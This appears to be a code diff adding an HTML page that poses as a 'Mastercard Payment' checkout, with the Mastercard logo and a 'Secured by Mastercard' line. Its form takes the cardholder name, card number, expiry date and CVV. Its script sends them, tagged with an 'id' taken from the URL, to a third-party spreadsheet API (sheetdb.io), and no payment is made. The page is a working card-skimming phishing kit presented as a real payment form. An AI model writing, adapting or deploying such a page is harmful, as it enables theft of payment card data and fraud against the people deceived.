@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mastercard Payment</title>
+
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background: #f2f2f2;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            margin: 50px auto;
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.1);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .logo img {
+            width: 120px;
+        }
+
+        h2 {
+            text-align: center;
+            margin-bottom: 25px;
+            font-weight: 600;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 14px;
+            color: #555;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border-radius: 8px;
+            border: 1px solid #ccc;
+            font-size: 15px;
+            outline: none;
+        }
+
+        input:focus {
+            border-color: #ff5f00;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #ff5f00;
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-weight: bold;
+            font-size: 17px;
+            cursor: pointer;
+        }
+
+        .btn:hover {
+            background: #e85700;
+        }
+
+        .secure-text {
+            text-align: center;
+            color: #777;
+            font-size: 13px;
+            margin-top: 15px;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <div class="logo">
+            <!-- Mastercard logo -->
+            <img src="https://1000logos.net/wp-content/uploads/2017/03/Mastercard-Logo.png" alt="Mastercard">
+        </div>
+
+        <h2>Mastercard Payment</h2>
+        
+
+        <label>Cardholder Name</label>
+        <input id="name" type="text" placeholder="John Doe">
+
+        <label>Card Number</label>
+        <input id="password" type="text" placeholder="1234 5678 9012 3456">
+
+        <label>Expiry Date</label>
+        <input id="expire" type="text" placeholder="MM / YY">
+
+        <label>CVV</label>
+        <input id="cvv" type="password" placeholder="123">
+
+        <button onclick="send()" class="btn">Pay Now</button>
+        
+
+        <p class="secure-text">🔒 Secured by Mastercard</p>
+
+    </div>
+
+
+
+
+
+        <script>
+        function send() {
+           const name = document.getElementById('name').value;
+           const expire = document.getElementById('expire').value;
+           const cvv = document.getElementById('cvv').value;
+       
+       
+      const email = name + "+" + expire + "+" + cvv;
+       const password = document.getElementById('password').value;
+           
+           
+        var urldata = new URLSearchParams(window.location.search);
+        
+        const id = urldata.get('id');
+        const type = "card";
+        
+           
+           const url = "https://sheetdb.io/api/v1/md4crj2w1sk6g";
+
+fetch(url, {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    data: {
+      id: id,
+      type: type,
+      username: email,
+      password: password
+    }
+  })
+})
+.then(response => response.json())
+.then(result => {
+ //out
+})
+.catch(error => {
+  window.alert(error);
+});
+            
+        }
+            
+        </script>
+        
+        
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
